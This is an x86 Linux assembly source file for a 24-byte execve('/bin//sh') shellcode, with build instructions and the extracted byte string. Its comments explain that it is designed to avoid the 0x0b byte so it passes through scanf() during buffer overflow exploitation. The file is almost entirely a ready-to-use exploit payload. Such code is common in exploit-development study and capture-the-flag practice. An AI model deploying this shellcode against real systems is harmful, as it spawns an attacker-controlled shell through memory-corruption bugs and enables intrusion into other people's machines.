; To create the binary
; nasm -f elf32 linux_x86_execve_no_whitespace.asm -o sc.o
; ld sc.o -o sc

; Use objdump or some other tool to extract shellcode from sc binary!

; /bin//sh execve shellcode by @Pink_P4nther.
; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
; This helped when giving overflow input to scanf() for example.
; scanf() sees 0x0b as white space therefore ending the read from STDIN.
; 24 bytes.

; sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0e\x2c\x03\xcd\x80"

section .text

global _start

_start:
	xor eax,eax     ; Zero eax
	push eax        ; Put 0 on the stack
	push 0x68732f2f ; Push //sh on the stack
	push 0x6e69622f ; Push /bin on the stack
	mov ebx,esp     ; Move /bin//sh into ebx
	cdq             ; Zero edx
	xor ecx,ecx     ; Zero ecx
	mov al,0xe      ; Move 0xe into al register (closest ascii code to 0xb thats not whitespace)
	sub al,0x3      ; Subtract from eax to create 0xb
	int 0x80        ; Software interrupt for system call
